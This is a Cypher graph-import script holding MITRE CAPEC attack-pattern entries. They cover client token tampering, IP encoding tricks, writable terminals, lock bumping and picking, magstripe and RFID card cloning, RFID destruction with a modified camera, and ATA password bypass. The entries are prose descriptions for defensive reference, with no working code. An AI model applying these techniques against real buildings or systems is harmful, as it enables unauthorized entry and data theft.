CREATE (:Description{id: 322, summary: "OrderedDict([('Text', \"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack allows the attacker to manipulate content in such a way as to produce messages or content that look authentic but may contain deceptive links, spam-like content, or links to the attackers' code. In general, content-spoofing within an application API can be employed to stage many different types of attacks varied based on the attackers' intent. The techniques require use of specialized software that allow the attacker to man-in-the-middle communications between the web browser and the remote system.\")])"});
MERGE (:Reference{id: "REF-25", local_id: "R.389.1", author: "['Tom Stracener', 'Sean Barnum']", title: "So Many Ways [...]: Exploiting Facebook and YoVille", publisher: "Defcon 18", pubdate: "2010"});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 346});
MERGE (:CWE{id: 602});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 209, text: "<div level=\"0\">\n  <p class=\"text\">A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.</p>\n</div>"});
CREATE (:AttackPattern{id: 39, name: "Manipulating Opaque Client-based Data Tokens", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 300, text: "<div level=\"0\">\n  <p class=\"text\">An attacker already has some access to the system or can steal the client based data tokens from another user who has access to the system.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 301, text: "<div level=\"0\">\n  <p class=\"text\">For an Attacker to viably execute this attack, some data (later interpreted by the application) must be held client-side in a way that can be manipulated without detection. This means that the data or tokens are not CRCd as part of their value or through a separate meta-data store elsewhere.</p>\n</div>"});
CREATE (:Submission{id: 329});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 254});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 323, summary: "OrderedDict([('Text', 'In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Enumerate information passed to client side", description: "<div level=\"0\">\n  <p class=\"text\">The attacker identifies the parameters used as part of tokens to take business or security decisions</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use WebScarab to reveal hidden fields while browsing.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a sniffer to capture packets</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">View source of web page to find hidden fields</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Examine URL to see if any opaque tokens are in it</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Disassemble or decompile client-side application</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 6, description: "<div level=\"0\">\n  <p class=\"text\">Use debugging tools such as File Monitor, Registry Monitor, Debuggers, etc.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Opaque hidden form fields in a web page</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Opaque session tokens/tickets</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Opaque protocol fields</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Opaque Resource Locator</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one opaque client-side token found"});
CREATE (:Outcome{id: 2, type: "Failure", description: "No opaque client-side tokens found"});
CREATE (:AttackStep{id: 2, title: "Determine protection mechanism for opaque token", description: "<div level=\"0\">\n  <p class=\"text\">The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Look for signs of well-known character encodings</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Look for cryptographic signatures</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Look for delimiters or other indicators of structure</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Standard signatures of well-known encodings detected</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Token or structural block's length being multiple of well-known block size of a cryptographic algorithm</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Clear structural boundaries or delimiters</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Protection/encoding scheme identified"});
CREATE (:Outcome{id: 2, type: "Failure", description: "No information about protection/encoding scheme could not be determined"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Modify parameter/token values", description: "<div level=\"0\">\n  <p class=\"text\">Trying each parameter in turn, the attacker modifies the values</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Modify tokens logically</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Modify tokens arithmetically</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Modify tokens bitwise</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Modify structural components of tokens</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Modify order of parameters/tokens</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in first step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in first step</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Cycle through values for each parameter.", description: "<div level=\"0\">\n  <p class=\"text\">Depending on the nature of the application, the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the server</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use network-level packet injection tools such as netcat</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use modified client (modified by reverse engineering)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use debugging tools to modify data in client</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in first step</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in first step</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Subversion of security controls on server"});
CREATE (:Outcome{id: 2, type: "Failure", description: "Client token reset by server"});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Detailed error message describing problem with token, received from server"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
MERGE (:CWE{id: 353});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 302});
MERGE (:CWE{id: 472});
MERGE (:CWE{id: 565});
MERGE (:CWE{id: 315});
MERGE (:CWE{id: 539});
MERGE (:CWE{id: 384});
MERGE (:CWE{id: 233});
CREATE (:ResourcesRequired{id: 210, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs no special hardware-based resources in order to conduct this attack. Software plugins, such as Tamper Data for Firefox, may help in manipulating URL- or cookie-based data.</p>\n</div>"});
CREATE (:AttackPattern{id: 390, name: "Bypassing Physical Security", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 330});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 324, summary: "OrderedDict([('Text', 'Facilities often used layered models for physical security such as traditional locks, Electronic-based card entry systems, coupled with physical alarms. Hardware security mechanisms range from the use of computer case and cable locks as well as RFID tags for tracking computer assets. This layered approach makes it difficult for random physical security breaches to go unnoticed, but is less effective at stopping deliberate and carefully planned break-ins. Avoiding detection begins with evading building security and surveillance and methods for bypassing the electronic or physical locks which secure entry points.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.390.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 391, name: "Bypassing Physical Locks", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 331});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 325, summary: "OrderedDict([('Text', 'An attacker uses techniques and methods to bypass physical security measures of a building or facility. Physical locks may range from traditional lock and key mechanisms, cable locks used to secure laptops or servers, locks on server cases, or other such devices. Techniques such as lock bumping, lock forcing via snap guns, or lock picking can be employed to bypass those locks and gain access to the facilities or devices they protect, although stealth, evidence of tampering, and the integrity of the lock following an attack, are considerations that may determine the method employed. Physical locks are limited by the complexity of the locking mechanism. While some locks may offer protections such as shock resistant foam to prevent bumping or lock forcing methods, many commonly employed locks offer no such countermeasures.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.391.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 392, name: "Lock Bumping", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 332});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 326, summary: "OrderedDict([('Text', 'An attacker uses a bump key to force a lock on a building or facility and gain entry. Lock Bumping is the use of a special type of key that can be tapped or bumped to cause the pins within the lock to fall into temporary alignment, allowing the lock to be opened. Lock bumping allows an attacker to open a lock without having the correct key. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A bump key is a specially constructed key that exploits this design. When the bump key is struck or firmly tapped, its teeth transfer the force of the tap into the key pins, causing the lock to momentarily shift into proper alignment for the mechanism to be opened.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.392.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 393, name: "Lock Picking", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 333});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 327, summary: "OrderedDict([('Text', 'An attacker uses lock picking tools and techniques to bypass the locks on a building or facility. Lock picking is the use of a special set of tools to manipulate the pins within a lock. Different sets of tools are required for each type of lock. Lock picking attacks have the advantage of being non-invasive in that if performed correctly the lock will not be damaged. A standard lock pin-and-tumbler lock is secured by a set of internal pins that prevent the tumbler device from turning. Spring loaded driver pins push down on the key pins preventing rotation so that the bolt remains in a locked position.. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. Most common locks, such as domestic locks in the US, can be picked using a standard 2 tools (i.e. a torsion wrench and a hook pick).')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.393.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 394, name: "Using a Snap Gun Lock to Force a Lock", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 334});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 328, summary: "OrderedDict([('Text', 'An attacker uses a Snap Gun, also known as a Pick Gun, to force the lock on a building or facility. A Pick Gun is a special type of lock picking instrument that works on similar principles as lock bumping. A snap gun is a hand-held device with an attached metal pick. The metal pick strikes the pins within the lock, transferring motion from the key pins to the driver pins and forcing the lock into momentary alignment. A standard lock is secured by a set of internal pins that prevent the device from turning. Spring loaded driver pins push down on the key pins. When the correct key is inserted, the ridges on the key push the key pins up and against the driver pins, causing correct alignment which allows the lock cylinder to rotate. A Snap Gun exploits this design by using a metal pin to strike all of the key pins at once, forcing the driver pins to shift into an unlocked position. Unlike bump keys or lock picks, a Snap Gun may damage the lock more easily, leaving evidence that the lock has been tampered with.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.394.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 395, name: "Bypassing Electronic Locks and Access Controls", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 335});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 329, summary: "OrderedDict([('Text', 'An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.395.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 396, name: "Bypassing Card or Badge-Based Systems", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 336});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 330, summary: "OrderedDict([('Text', \"An attacker bypasses the security of a card-based system by using techniques such as cloning access cards or using brute-force techniques. Card-based systems are widespread throughout business, government, and supply-chain management. Attacks against card-based systems vary widely based on the attackers' goals, but commonly include unauthorized reproduction of cards, brute-force creation of valid card-values, and attacks against systems which read or process card data. Due to the inherent weaknesses of card and badge security, high security environments will rarely rely upon the card or badge alone as a security mechanism. Common card based systems are used for financial transactions, user identification, and access control. Cloning attacks involve making an unauthorized copy of a user's card while brute-force attacks involve creating new cards with valid values. Denial of service attacks against card-based systems involve rendering the reader, or the card itself, to become disabled. Such attacks may be useful in a fail-closed system for keeping authorized users out of a location while a crime is in progress, whereas fail-open systems may grant access, or an alarm my fail to trigger, if an attacker disables or damages the card authentication device.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.396.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 397, name: "Cloning Magnetic Strip Cards", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 337});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 331, summary: "OrderedDict([('Text', \"An attacker duplicates the data on a Magnetic strip card (i.e. 'swipe card' or 'magstripe') to gain unauthorized access to a physical location or a person's private information. Magstripe cards encode data on a band of iron-based magnetic particles arrayed in a stripe along a rectangular card. Most magstripe card data formats conform to ISO standards 7810, 7811, 7813, 8583, and 4909. The primary advantage of magstripe technology is ease of encoding and portability, but this also renders magnetic strip cards susceptible to unauthorized duplication. If magstripe cards are used for access control, all an attacker need do is obtain a valid card long enough to make a copy of the card and then return the card to its location (i.e. a co-worker's desk). Magstripe reader/writers are widely available as well as software for analyzing data encoded on the cards. By swiping a valid card, it becomes trivial to make any number of duplicates that function as the original.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.397.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 398, name: "Magnetic Strip Card Brute Force Attacks", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 302, text: "<div level=\"0\">\n  <p class=\"text\">The ability to calculate a card checksum and write out a valid checksum value. Some cards are protected by a checksum calculation, therefore it is necessary to determine what algorithm is being used to calculate the checksum and to employ that algorithm to calculate and write a new valid checksum for the card being created.</p>\n</div>"});
CREATE (:Submission{id: 338});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 332, summary: "OrderedDict([('Text', 'An attacker analyzes the data on two or more magnetic strip cards and is able to generate new cards containing valid sequences that allow unauthorized access and/or impersonation of individuals. Often, magnetic strip encoding methods follow a common format for a given system laid out in up to three tracks. A single card may allow access to a corporate office complex shared by multiple companies. By analyzing how the data is stored on a card, it is also possible to create valid cards via brute-force attacks. For example, a single card can grant access to a building, a floor, and a suite number. Reading and analyzing data on multiple cards, then performing a difference analysis between data encoded on three different cards, can reveal clues as to how to generate valid cards that grant access to restricted areas of a building or suites/rooms within that building. Data stored on magstripe cards is often unencrypted, therefore comparing which data changes when two or more cards are analyzed can yield results that aid in determining the structure of the card data. A trivial example would be a common system data format on a data track which binary encodes the suite number of a building that a card will open. By creating multiple cards with differing binary encoded segments it becomes possible to enter unauthorized areas or pass through checkpoints giving the electronic ID of other persons.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.398.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 399, name: "Cloning RFID Cards or Chips", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 339});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 333, summary: "OrderedDict([('Text', \"An attacker analyzes data returned by an RFID chip and uses this information to duplicate a RFID signal that responds identically to the target chip. In some cases RFID chips are used for building access control, employee identification, or as markers on products being delivered along a supply chain. Some organizations also embed RFID tags inside computer assets to trigger alarms if they are removed from particular rooms, zones, or buildings. Similar to Magnetic strip cards, RFID cards are susceptible to duplication (cloning) and reuse. RFID (Radio Frequency Identification) are passive devices which consist of an integrated circuit for processing RF signals and an antenna. RFID devices are passive in that they lack an on on-board power source. The majority of RFID chips operate on either the 13.56 MHz or 135 KHz frequency. The chip is powered when a signal is received by the antenna on the chip, powering the chip long enough to send a reply message. An attacker is able to capture and analyze RFID data by either stimulating the chip to respond or being proximate to the chip when it sends a response to a remote transmitter. This allows the attacker to duplicate the signal and conduct attacks such as gaining unauthorized access to a building or impersonating a user's identification.\")])"});
MERGE (:Reference{id: "REF-20", local_id: "R.399.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 4, name: "Using Alternative IP Address Encodings", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 303, text: "<div level=\"0\">\n  <p class=\"text\">The target software must fail to anticipate all of the possible valid encodings of an IP/web address.</p>\n</div>"});
CREATE (:Submission{id: 340});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 334, summary: "OrderedDict([('Text', ['This attack relies on the attacker using unexpected formats for representing IP addresses. Networked applications may expect network location information in a specific format, such as fully qualified domains names, URL, IP address, or IP Address ranges. The issue that the attacker can exploit is that these design assumptions may not be validated against a variety of different possible encodings and network address location formats. Applications that use naming for creating policy namespaces for managing access control may be susceptible to being queried directly by IP addresses, which is ultimately a more generally authoritative way of communicating on a network.', 'Alternative IP addresses can be used by the attacker to bypass application access control in order to gain access to data that is only protected by obscuring its location.', 'In addition this type of attack can be used as a reconnaissance mechanism to provide entry point information that the attacker gathers to penetrate deeper into the system.'])])"});
MERGE (:Reference{id: "REF-2", local_id: "R.4.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 291});
MERGE (:CWE{id: 180});
MERGE (:CWE{id: 41});
MERGE (:CWE{id: 345});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 211, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</p>\n</div>"});
CREATE (:AttackPattern{id: 40, name: "Manipulating Writeable Terminal Devices", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 304, text: "<div level=\"0\">\n  <p class=\"text\">User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals.</p>\n</div>"});
CREATE (:Submission{id: 341});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 335, summary: "OrderedDict([('Text', 'This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.40.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 306});
MERGE (:CWE{id: 74});
CREATE (:ResourcesRequired{id: 212, text: "<div level=\"0\">\n  <p class=\"text\">Access to a terminal on the target network</p>\n</div>"});
CREATE (:AttackPattern{id: 400, name: "RFID Chip Deactivation or Destruction", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 342});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 336, summary: "OrderedDict([('Text', 'An attacker uses methods to deactivate a passive RFID tag for the purpose of rendering the tag, badge, card, or object containing the tag unresponsive. RFID tags are used primarily for access control, inventory, or anti-theft devices. The purpose of attacking the RFID chip is to disable or damage the chip without causing damage to the object housing it. When correctly performed the RFID chip can be disabled or destroyed without visible damage or marking to whatever item or device containing the chip. Attacking the chip directly allows for the security device or method to be bypassed without directly damaging the device itself, such as an alarm system or computer system Various methods exist for damaging or deactivating RFID tags. For example, most common RFID chips can be permanently destroyed by creating a small electromagnetic pulse near the chip itself. One method employed requires the modifying a disposable camera by disconnecting the flash bulb and soldering a copper coil to the capacitor. Firing the camera in this configuration near any RFID chip-based device creates an EMP pulse sufficient to destroy the chip without leaving evidence of tampering. So far this attack has been demonstrated to work against RFID chips in the 13.56 MHz range.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.400.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 401, name: "Hacking Hardware", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 343});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 255});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Severity"});
CREATE (:PreviousEntryName{id: 70, name: "Hacking Hardware Devices or Components"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 337, summary: "OrderedDict([('Text', \"An attacker changes or replaces a hardware component which undermines the system's integrity for the purpose of carrying out an attack. After deployment, it is not uncommon for upgrades and replacements to occur involving hardware and various replaceable parts. These upgrades and replacements are intended to correct defects, provide additional features, and to replace broken or worn-out parts. However, by forcing or tricking the replacement of a good component with a defective or corrupted component, an attacker can leverage known defects to obtain a desired malicious impact.\")])"});
CREATE (:AttackPattern{id: 402, name: "Bypassing ATA Password Security", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 305, text: "<div level=\"0\">\n  <p class=\"text\">Access to the system containing the ATA Drive so that the drive can be physically removed from the system.</p>\n</div>"});
CREATE (:Submission{id: 344});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 338, summary: "OrderedDict([('Text', 'An attacker exploits a weakness in ATA security on a drive to gain access to the information the drive contains without supplying the proper credentials. ATA Security is often employed to protect hard disk information from unauthorized access. The mechanism requires the user to type in a password before the BIOS is allowed access to drive contents. Some implementations of ATA security will accept the ATA command to update the password without the user having authenticated with the BIOS. This occurs because the security mechanism assumes the user has first authenticated via the BIOS prior to sending commands to the drive. Various methods exist for exploiting this flaw, the most common being installing the ATA protected drive into a system lacking ATA security features (a.k.a. hot swapping). Once the drive is installed into the new system the BIOS can be used to reset the drive password.')])"});
MERGE (:Reference{id: "REF-20", local_id: "R.402.1", author: "['Stuart McClure', 'Joel Scambray', 'George Kurtz']", title: "Hacking Exposed: Network Security Secrets & Solutions", section: "Chapter 9: Hacking Hardware", publisher: "McGraw Hill", pubdate: "2009"});
CREATE (:AttackPattern{id: 404, name: "Social Information Gathering Attacks", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 345});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 339, summary: "OrderedDict([('Text', \"An attacker employs various means of gathering information about a target company, organization, or person. These techniques may range from using telephones, gathering trash or other discarded information, intrusion within company property, using the Internet for research, to querying individuals under false or misleading pretenses. A social engineer can use many small pieces of information to combine into a useful vulnerability of a system. Information can be important whether it comes from the janitor's office or from the CEO's office; each piece of paper, employee spoken to or area visited by the social engineer can add up enough information to attain access to sensitive data and resources of the company. The lesson here is all information, no matter how insignificant the employee believes it to be, may assist in creating a vulnerability for a company and an entrance for a social engineer. While the ultimate goal of the attacker may vary the purpose of these attacks is usually to gain access to computer systems or facilities.\")])"});
MERGE (:Reference{id: "REF-30", local_id: "R.404.1", title: "The Official Social Engineering Portal", publisher: "Tick Tock Computers, LLC", link: "http://www.social-engineer.org"});
CREATE (:AttackPattern{id: 405, name: "Social Information Gathering via Research", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 346});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
